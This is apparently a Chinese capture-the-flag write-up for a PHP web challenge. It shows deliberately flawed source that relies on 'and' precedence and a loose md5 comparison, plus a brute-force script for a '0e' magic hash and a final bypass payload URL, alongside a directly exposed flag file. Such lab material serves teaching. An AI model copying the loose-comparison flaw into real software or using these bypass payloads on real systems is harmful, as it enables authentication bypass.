### `0x00` 前言

​	我一直都认为，思维方式其实比知识更加重要，于是本题故意留了一个漏洞，这里的`flag`文件是可以直接访问的。也就是说我们想要拿到`flag`根本不需要费那么大的力气。

### `0x01` WP

#### 1.解法一

直接访问 `http://146.56.204.138:13333/flag`，打开`F12`就可以看到`flag`了。

![image-20210206152228165](https://i.loli.net/2021/02/06/Aj6cSf5OTPR93NJ.png)

#### 2.解法二

题目直接给出了源码:

```php
<?php
include "flag";
if(!$_GET['source']){    
    highlight_file(__FILE__);
}
$a = $_GET['a'];
$b = $_GET['b'];
$c = $_GET['c'];
$check = $a and $b;
if($check){
    if($a and $b){
        die("No flag!Try it again!");
    }
    else{
        if($c == md5($c)){
            die($flag);
        }
    }
}
else{
    die("Are You kidding?");
}
```

简单看一下就可以发现，我们想要获得`flag`需要满足以下的条件:

```php
1.$check为true 并且 $a and $b 为false
2.$c == md5($c)
```

我们先来看条件一:

看上去是一个逻辑悖论，但实际上对于`php`来说`and`这个操作符是有`bug`的。这个操作符只会取$a位置的值来做判断。考虑下面一行代码:

```php
$check = 1 and 0; //返回 true
```

于是我们可以使用`GET`方法传入`?a=1&b=0`轻松绕过。

我们继续来看条件二:

```php
$c == md5($c)
```

这个条件看上去根本不可能成立，奈何在`php`中有一个东西叫做弱类型比较。通过弱类型比较，我们只要让`$c`是一个`0e`开头的字符串，而`md5`后的`$c`也是`0e`开头的字符串就可以了。

PS: 原理是弱类型比较中，`0e`开头的字符串会被当做科学计数法。而0开头的科学计数法怎么都是0吧。

所以我们可以写一个脚本来自动的跑出结果:

```php
<?php
for($i = 0; $i < 10000000000; $i++){
	$j = "0e".$i;
	if($j == md5($j)){
		echo $j;
		break;
	}
}
?>
    
//跑出结果为 0e215962017
```

那么我们就可以写出最后的`payload`:

```php
http://192.168.193.128:13333/?a=1&b=0&c=0e215962017
```

![image-20210206154546762](https://i.loli.net/2021/02/06/thpLebMWHB3GSCQ.png)